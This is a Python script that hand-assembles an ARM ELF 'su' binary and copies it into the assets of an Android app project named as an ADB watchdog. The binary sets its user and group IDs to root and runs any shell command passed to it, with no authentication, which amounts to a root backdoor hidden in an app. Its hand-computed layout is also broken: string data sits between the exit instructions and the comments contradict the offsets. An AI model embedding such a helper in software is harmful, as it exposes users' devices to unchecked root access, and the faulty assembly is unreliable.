#!/usr/bin/env python3
import struct

def assemble_arm():
    # We will build a pure 32-bit ARM ELF executable (static, no interpreter, no libc).
    #
    # ARM instructions (32-bit little endian):
    #
    # _start:
    #   mov r0, #0            -> e3a00000
    #   mov r7, #214           -> e3a070d6 (__NR_setgid32)
    #   svc 0                  -> ef000000
    #   mov r0, #0            -> e3a00000
    #   mov r7, #213           -> e3a070d5 (__NR_setuid32)
    #   svc 0                  -> ef000000
    #   ldr r4, [sp]           -> e59d4000 (argc)
    #   cmp r4, #1             -> e3540001
    #   ble .Ldefault_id       -> da000008 (+8 instrs to .Ldefault_id)
    #   ldr r5, [sp, #8]       -> e59d5008 (argv[1])
    #   ldrb r6, [r5, #0]      -> e5d56000
    #   cmp r6, #'-'           -> e356002d
    #   bne .Lcustom           -> 1a000007 (+7 instrs to .Lcustom)
    #   ldrb r6, [r5, #1]      -> e5d56001
    #   cmp r6, #'c'           -> e3560063
    #   bne .Lcustom           -> 1a000004 (+4 instrs to .Lcustom)
    #   cmp r4, #2             -> e3540002 (argc <= 2?)
    #   ble .Ldefault_id       -> da000002
    #   ldr r2, [sp, #12]      -> e59d200c (argv[2] -> r2)
    #   b .Lrun_sh             -> ea000004
    # .Lcustom:
    #   ldr r2, [sp, #8]       -> e59d2008 (argv[1] -> r2)
    #   b .Lrun_sh             -> ea000001
    # .Ldefault_id:
    #   adr r2, str_id         -> e28f20xx
    # .Lrun_sh:
    #   adr r0, str_sh
    #   adr r1, str_dash_c
    #   mov r3, #0             -> e3a03000
    #   push {r0, r1, r2, r3}  -> e92d000f
    #   adr r0, str_sh
    #   mov r1, sp             -> e1a0100d
    #   mov r2, #0             -> e3a02000
    #   mov r7, #11            -> e3a0700b (__NR_execve)
    #   svc 0                  -> ef000000
    #   mov r0, #127           -> e3a0007f
    #   mov r7, #1             -> e3a07001 (__NR_exit)
    #   svc 0                  -> ef000000

    code = bytearray()
    
    # 0x00: mov r0, #0
    code += struct.pack('<I', 0xe3a00000)
    # 0x04: mov r7, #214 (__NR_setgid32)
    code += struct.pack('<I', 0xe3a070d6)
    # 0x08: svc 0
    code += struct.pack('<I', 0xef000000)
    # 0x0C: mov r0, #0
    code += struct.pack('<I', 0xe3a00000)
    # 0x10: mov r7, #213 (__NR_setuid32)
    code += struct.pack('<I', 0xe3a070d5)
    # 0x14: svc 0
    code += struct.pack('<I', 0xef000000)
    # 0x18: ldr r4, [sp] (argc)
    code += struct.pack('<I', 0xe59d4000)
    # 0x1C: cmp r4, #1
    code += struct.pack('<I', 0xe3540001)
    # 0x20: ble .Ldefault_id (PC + 8 + offset -> target is 0x4c -> offset = 0x4c - 0x28 = 0x24 = 9 words)
    code += struct.pack('<I', 0xda000009)
    # 0x24: ldr r5, [sp, #8] (argv[1])
    code += struct.pack('<I', 0xe59d5008)
    # 0x28: ldrb r6, [r5, #0]
    code += struct.pack('<I', 0xe5d56000)
    # 0x2C: cmp r6, #'-' (0x2d)
    code += struct.pack('<I', 0xe356002d)
    # 0x30: bne .Lcustom (target 0x48 -> offset = 0x48 - 0x38 = 0x10 = 4 words)
    code += struct.pack('<I', 0x1a000004)
    # 0x34: ldrb r6, [r5, #1]
    code += struct.pack('<I', 0xe5d56001)
    # 0x38: cmp r6, #'c' (0x63)
    code += struct.pack('<I', 0xe3560063)
    # 0x3C: bne .Lcustom (target 0x48 -> offset = 0x48 - 0x44 = 4 bytes = 1 word)
    code += struct.pack('<I', 0x1a000001)
    # 0x40: cmp r4, #2
    code += struct.pack('<I', 0xe3540002)
    # 0x44: bgt .Lhave_cmd2 (target 0x50 -> offset = 0x50 - 0x4c = 4 bytes = 1 word)
    code += struct.pack('<I', 0xca000001)
    # 0x48: .Lcustom: ldr r2, [sp, #8] (argv[1])
    code += struct.pack('<I', 0xe59d2008)
    # 0x4C: b .Lrun_sh (target 0x54 -> offset = 0x54 - 0x54 = 0 words)
    code += struct.pack('<I', 0xea000000)
    # 0x50: .Lhave_cmd2: ldr r2, [sp, #12] (argv[2])
    code += struct.pack('<I', 0xe59d200c)
    # 0x54: b .Lrun_sh (target 0x5c -> offset = 0x5c - 0x5c = 0 words)
    code += struct.pack('<I', 0xea000000)
    # 0x58: .Ldefault_id: add r2, pc, #offset_to_str_id
    # target str_id at 0x88 -> offset = 0x88 - (0x58 + 8) = 0x28
    code += struct.pack('<I', 0xe28f2028)
    
    # 0x5C: .Lrun_sh:
    # add r0, pc, #offset_to_str_sh (0x90 - (0x5c + 8) = 0x2c)
    code += struct.pack('<I', 0xe28f002c)
    # 0x60: add r1, pc, #offset_to_str_dash_c (0x80 - (0x60 + 8) = 0x18)
    code += struct.pack('<I', 0xe28f1018)
    # 0x64: mov r3, #0
    code += struct.pack('<I', 0xe3a03000)
    # 0x68: push {r0, r1, r2, r3} (puts 4 pointers on stack)
    code += struct.pack('<I', 0xe92d000f)
    # 0x6C: add r0, pc, #offset_to_str_sh (0x90 - (0x6c + 8) = 0x1c)
    code += struct.pack('<I', 0xe28f001c)
    # 0x70: mov r1, sp (argv pointer)
    code += struct.pack('<I', 0xe1a0100d)
    # 0x74: mov r2, #0 (envp NULL)
    code += struct.pack('<I', 0xe3a02000)
    # 0x78: mov r7, #11 (__NR_execve)
    code += struct.pack('<I', 0xe3a0700b)
    # 0x7C: svc 0
    code += struct.pack('<I', 0xef000000)
    # 0x80: str_dash_c: "-c\0\0"
    code += b"-c\0\0"
    # 0x84: mov r0, #127
    code += struct.pack('<I', 0xe3a0007f)
    # 0x88: str_id: "id\0\0"
    code += b"id\0\0"
    # 0x8C: mov r7, #1 (__NR_exit)
    code += struct.pack('<I', 0xe3a07001)
    # 0x90: str_sh: "/system/bin/sh\0\0" (16 bytes)
    code += b"/system/bin/sh\0\0"
    # 0xA0: svc 0
    code += struct.pack('<I', 0xef000000)

    # Now wrap into an ELF header (ET_EXEC = 2, ARM = 40, Entry = 0x8000 + 0x54)
    # Base load address: 0x8000
    base_addr = 0x8000
    ehdr_size = 52
    phdr_size = 32
    hdr_total = ehdr_size + phdr_size
    
    file_size = hdr_total + len(code)
    mem_size = file_size
    entry_point = base_addr + hdr_total

    # ELF Header (32-bit Little Endian)
    e_ident = b'\x7fELF\x01\x01\x01\x00' + b'\x00'*8
    e_type = 2         # ET_EXEC
    e_machine = 40     # EM_ARM
    e_version = 1
    e_entry = entry_point
    e_phoff = ehdr_size
    e_shoff = 0
    e_flags = 0x05000000 # EF_ARM_EABI_VER5
    e_ehsize = ehdr_size
    e_phentsize = phdr_size
    e_phnum = 1
    e_shentsize = 0
    e_shnum = 0
    e_shstrndx = 0

    ehdr = struct.pack('<16sHHIIIIIHHHHHH',
        e_ident, e_type, e_machine, e_version, e_entry,
        e_phoff, e_shoff, e_flags, e_ehsize, e_phentsize,
        e_phnum, e_shentsize, e_shnum, e_shstrndx
    )

    # Program Header (PT_LOAD, R|W|X = 7)
    p_type = 1        # PT_LOAD
    p_offset = 0
    p_vaddr = base_addr
    p_paddr = base_addr
    p_filesz = file_size
    p_memsz = mem_size
    p_flags = 7       # PF_R | PF_W | PF_X
    p_align = 0x1000  # 4096

    phdr = struct.pack('<IIIIIIII',
        p_type, p_offset, p_vaddr, p_paddr,
        p_filesz, p_memsz, p_flags, p_align
    )

    elf_binary = ehdr + phdr + bytes(code)
    return elf_binary

if __name__ == '__main__':
    binary = assemble_arm()
    with open('APKNexusADBWatchdog-2.4/factory/nexus_su', 'wb') as f:
        f.write(binary)
    with open('APKNexusADBWatchdog-2.4/app/src/main/assets/native/armeabi-v7a/nexus_su', 'wb') as f:
        f.write(binary)
    with open('APKNexusADBWatchdog-2.4/app/src/main/assets/nexus_su', 'wb') as f:
        f.write(binary)
    print(f'Successfully built static ARM ELF nexus_su ({len(binary)} bytes)')
